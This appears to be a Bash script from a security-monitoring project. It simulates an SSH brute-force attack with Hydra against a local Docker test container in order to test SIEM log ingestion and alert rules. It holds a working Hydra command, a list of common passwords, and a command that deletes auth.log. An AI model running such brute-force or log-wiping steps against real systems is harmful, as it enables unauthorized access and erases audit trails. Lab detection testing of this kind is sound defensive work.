#!/bin/bash
# ─────────────────────────────────────────────────────────────────────────────
# Simulación de ataque: SSH BRUTE FORCE (fuerza bruta, MITRE T1110)
#
# Usa Hydra (contenedor `hydra-attacker`) contra el servidor SSH de prueba
# (contenedor `ssh-target`). Los intentos fallidos quedan en /var/log/auth.log
# dentro de `ssh-target`; Filebeat los recolecta y Logstash los normaliza hacia
# `filebeat-*` (mismo camino que un ataque real).
#
# A diferencia de port scan / phishing, este ataque SÍ necesita el stack y los
# contenedores de simulación arriba: no hay modo `--offline`, porque lo que se
# está probando es justamente la ingesta real Filebeat→Logstash→Elasticsearch.
#
# Uso:
#   docker compose --profile simulation up -d ssh-target hydra-attacker
#   bash simulation/run-brute-force.sh
# ─────────────────────────────────────────────────────────────────────────────
set -euo pipefail

require_container() { # nombre
  if ! docker ps --format '{{.Names}}' | grep -qx "$1"; then
    echo "[ERROR] El contenedor '$1' no está corriendo."
    echo "        Levantalo con: docker compose --profile simulation up -d ssh-target hydra-attacker"
    exit 1
  fi
}

require_container ssh-target
require_container hydra-attacker

echo "[*] Limpiando logs previos en ssh-target..."
docker exec ssh-target rm -f /var/log/auth.log

echo "[*] Preparando diccionario de contraseñas en hydra-attacker..."
# 24 contraseñas incorrectas + la real al final. El tamaño no es decorativo: el
# clasificador marca fuerza bruta a partir de BRUTE_FORCE_THRESHOLD = 20 fallos
# (src/classifier.py). Con un diccionario de 4, el ataque solo se clasificaba como
# tal si Kibana llegaba a disparar una alerta primero — y si el pipeline corría
# antes que la regla, el mismo ataque aparecía como "autenticación sospechosa".
# Con 24 fallos la detección se sostiene sola, sin depender del reloj del SIEM.
docker exec hydra-attacker bash -c "printf '%s\n' \
  password123 admin 123456 qwerty letmein welcome monkey dragon master sunshine \
  princess football baseball trustno1 iloveyou starwars passw0rd abc123 login \
  admin123 root toor changeme secret testpassword > /tmp/passwords.txt"
# testpassword es la password real del usuario testuser (ver docker-compose.yml)
# y va última: el ataque falla 24 veces y acierta en el intento 25, que es lo que
# dispara además la regla crítica "SSH Successful Login After Brute Force".

SSH_TARGET_IP=$(docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' ssh-target)
echo "[*] Target SSH Server IP: $SSH_TARGET_IP"

echo "[*] Iniciando ataque de fuerza bruta con Hydra..."
docker exec hydra-attacker hydra -l testuser -P /tmp/passwords.txt "$SSH_TARGET_IP" -s 2222 ssh -V -t 1 || true

echo "[+] Ataque simulado. Esperando 10s a que los logs lleguen a Elasticsearch..."
sleep 10

echo "[*] Contenido de auth.log en ssh-target:"
docker exec ssh-target cat /var/log/auth.log || echo "[!] No se encontró auth.log todavía."

echo "[OK] Listo. Corré:  python3 src/siem_pipeline.py   y luego abrí el dashboard."
